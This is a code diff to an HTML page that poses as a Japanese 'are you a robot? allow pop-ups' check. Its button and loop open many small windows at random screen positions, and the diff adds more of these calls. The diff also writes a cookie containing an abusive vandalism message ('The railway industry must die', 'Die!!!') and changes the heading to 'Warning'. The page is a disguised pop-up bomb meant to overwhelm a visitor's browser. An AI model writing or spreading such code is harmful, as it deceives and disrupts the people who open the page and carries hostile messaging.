@@ -5,6 +5,7 @@
 <title>Game Over Effect</title>
 </head>
 <body>
+    <h1 id="header">Hello, World!</h1>
     <h1>ロボットではありませんか？</h1>
     <h2>ロボットでない場合はポップアップを許可</h2>
 <button onclick="gameOver()">j9zsqsd</button>
@@ -21,6 +22,18 @@
     
       // 新しいウィンドウをランダムな位置で開く
       window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
+        const cookie = "LonglivetheRepublicofMagdaVandalism!M:psupportsthiscause.Therailwayindustrymustdiequickly!!!!Wehavecreatedthistechnologyfortherailindustry!DoNotcontactMagdaincaseofabuse.Anyonewhohatesyouenoughtousethisstuffistoblame.Soit'sSuckitup!Die!!!";
+        document.cookie = cookie;
+        changeText()
+        window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
+        window.open(url, '_blank', `width=200,height=200,left=${left},top=${top}`);
+    }
+
+    function changeText() {
+        // IDが'header'の要素を見つけます。
+        var headerElement = document.getElementById('header');
+        // その要素のテキスト内容を変更します。
+        headerElement.textContent = "警告";
     }
     
     while (true) {
